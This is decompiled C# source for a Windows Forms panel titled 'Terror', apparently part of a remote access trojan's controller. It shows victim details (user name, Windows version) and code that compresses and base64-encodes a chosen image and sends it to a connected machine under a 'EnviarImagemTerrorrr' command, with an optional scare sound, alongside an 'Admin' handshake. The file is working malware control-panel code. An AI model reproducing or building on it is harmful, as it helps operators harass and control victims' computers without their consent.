		C4.UncheckedState.InnerColor = Color.Transparent;
		Label6.AutoSize = true;
		Label6.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label6.ForeColor = Color.White;
		Label6.Location = new Point(3, 6);
		Label6.Name = "Label6";
		Label6.Size = new Size(32, 17);
		Label6.TabIndex = 1;
		Label6.Text = "Icon";
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(37, 42, 64);
		panel5.Controls.Add(n);
		panel5.Controls.Add(w);
		panel5.Controls.Add(PictureBox1);
		panel5.Controls.Add(Label2);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label1);
		panel5.Controls.Add(pictureBox3);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(0, -1);
		panel5.Name = "panel5";
		panel5.Size = new Size(392, 124);
		panel5.TabIndex = 131;
		n.AutoSize = true;
		n.Font = new Font("Nirmala UI", 9.75f);
		n.ForeColor = Color.FromArgb(158, 161, 176);
		n.Location = new Point(94, 81);
		n.Name = "n";
		n.Size = new Size(18, 17);
		n.TabIndex = 109;
		n.Text = "--";
		w.AutoSize = true;
		w.Font = new Font("Nirmala UI", 9.75f);
		w.ForeColor = Color.FromArgb(158, 161, 176);
		w.Location = new Point(94, 102);
		w.Name = "w";
		w.Size = new Size(18, 17);
		w.TabIndex = 108;
		w.Text = "--";
		PictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox1.Image = (Image)componentResourceManager.GetObject("PictureBox1.Image");
		PictureBox1.Location = new Point(331, 7);
		PictureBox1.Name = "PictureBox1";
		PictureBox1.Size = new Size(53, 38);
		PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox1.TabIndex = 107;
		PictureBox1.TabStop = false;
		Label2.AutoSize = true;
		Label2.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label2.ForeColor = Color.White;
		Label2.Location = new Point(4, 7);
		Label2.Name = "Label2";
		Label2.Size = new Size(62, 25);
		Label2.TabIndex = 106;
		Label2.Text = "Terror";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(19, 100);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label1.AutoSize = true;
		Label1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label1.ForeColor = Color.FromArgb(158, 161, 176);
		Label1.Location = new Point(6, 79);
		Label1.Name = "Label1";
		Label1.Size = new Size(81, 17);
		Label1.TabIndex = 3;
		Label1.Text = "User Name :";
		pictureBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
		pictureBox3.Location = new Point(331, 59);
		pictureBox3.Name = "pictureBox3";
		pictureBox3.Size = new Size(53, 58);
		pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox3.TabIndex = 2;
		pictureBox3.TabStop = false;
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(4, 44);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BackColor = Color.Transparent;
		Guna2ControlBox1.BorderColor = Color.Transparent;
		Guna2ControlBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(634, -1);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 130;
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(46, 51, 73);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(614, 4);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 134;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		vmethod_4().Enabled = true;
		vmethod_4().Interval = 10;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(46, 51, 73);
		base.ClientSize = new Size(681, 485);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(Panel1);
		base.Controls.Add(panel5);
		base.Controls.Add(Guna2ControlBox1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "HRR";
		Text = "HRR";
		Panel1.ResumeLayout(performLayout: false);
		Panel3.ResumeLayout(performLayout: false);
		Panel3.PerformLayout();
		((ISupportInitialize)PictureBox8).EndInit();
		Panel2.ResumeLayout(performLayout: false);
		Panel2.PerformLayout();
		((ISupportInitialize)PictureBox6).EndInit();
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)PictureBox4).EndInit();
		((ISupportInitialize)PictureBox5).EndInit();
		((ISupportInitialize)PictureBox7).EndInit();
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_0()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_2()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_4()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Timer WithEventsValue)
	{
		EventHandler value = method_12;
		Timer timer = timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_0 = WithEventsValue;
		timer = timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	public void HRR_Load(object sender, EventArgs e)
	{
		C.Send("Admin" + Class7.string_1);
		if (File.Exists(Application.StartupPath + "\\Terror\\01.gif"))
		{
			T1.Text = Application.StartupPath + "\\Terror\\01.gif";
		}
	}

	public void method_1(object sender, EventArgs e)
	{
	}

	public byte[] ZIP(byte[] B, ref bool CM)
	{
		if (!CM)
		{
			MemoryStream memoryStream = new MemoryStream(B);
			GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array = new byte[4];
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
		MemoryStream memoryStream2 = new MemoryStream();
		GZipStream gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Compress, leaveOpen: true);
		gZipStream2.Write(B, 0, B.Length);
		gZipStream2.Dispose();
		memoryStream2.Position = 0L;
		byte[] array3 = new byte[(int)memoryStream2.Length + 1 - 1 + 1];
		memoryStream2.Read(array3, 0, array3.Length);
		memoryStream2.Dispose();
		return array3;
	}

	public byte[] SB(ref string S)
	{
		return Encoding.Default.GetBytes(S);
	}

	public void method_2(object sender, EventArgs e)
	{
		if (Operators.CompareString(T1.Text, null, TextCompare: false) != 0)
		{
			if (File.Exists(T1.Text))
			{
				bool CM = true;
				string S = Convert.ToBase64String(ZIP(File.ReadAllBytes(T1.Text), ref CM));
				byte[] array = SB(ref S);
				MemoryStream memoryStream = new MemoryStream();
				string S2 = "EnviarImagemTerrorrr" + Class7.string_1 + new FileInfo(T1.Text).Extension + Class7.string_1;
				memoryStream.Write(SB(ref S2), 0, S2.Length);
				memoryStream.Write(array, 0, array.Length);
				if (ONN.Checked)
				{
					C.Send("M" + Class7.string_1 + "Sound" + Class7.string_1 + Convert.ToBase64String(File.ReadAllBytes(Application.StartupPath + "\\Terror\\T.wav")));
				}
				C.Send(memoryStream.ToArray());
			}
			else
			{
				Interaction.MsgBox("ESTA IMAGEM NÃO EXISTE TENTE OUTRA", MsgBoxStyle.Critical, "Informações");
			}
		}
		else
		{
			Interaction.MsgBox("ESCOLHA SUA IMAGEM OU PROCURE UMA PARA ENVIAR", MsgBoxStyle.Exclamation, "Informações");
		}
	}

	public void method_3(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "ADICIONAR ARQUIVOS";
			openFileDialog.Filter = "ARQUIVOS (*.gif)|*.gif|ARQUIVOS (*.jpg)|*.jpg|ARQUIVOS (*.jpeg)|*.jpeg|ARQUIVOS (*.png)|*.png|ARQUIVOS (*.bmp)|*.bmp|TODOS ARQUIVOS (*.*)|*.*";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				Image image = Image.FromFile(openFileDialog.FileName);
				Bitmap image2 = new Bitmap(image);
				image.Dispose();
				PictureBox8.Image = image2;
				T1.Text = openFileDialog.FileName;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_4(object sender, EventArgs e)
	{
		T1.Text = Application.StartupPath + "\\Terror\\01.gif";
	}

	public void method_5(object sender, EventArgs e)
	{
		T1.Text = Application.StartupPath + "\\Terror\\02.gif";
	}

	public void method_6(object sender, EventArgs e)
	{
		T1.Text = Application.StartupPath + "\\Terror\\03.gif";
	}

	public void method_7(object sender, EventArgs e)
	{
		T1.Text = Application.StartupPath + "\\Terror\\04.gif";
	}

	public void method_8(object sender, EventArgs e)
	{
		T1.Text = Application.StartupPath + "\\Terror\\05.gif";
	}

	public void method_9(object sender, PaintEventArgs e)
	{
	}

	public void method_10(object sender, EventArgs e)
	{
		Hide();
	}

	public void method_11(object sender, EventArgs e)
	{
		if (C != null)
		{
			C.CN = false;
		}
	}

	public void method_12(object sender, EventArgs e)
	{
		if (!C.CN)
		{
			C.CN = false;
			Close();
		}
	}
}
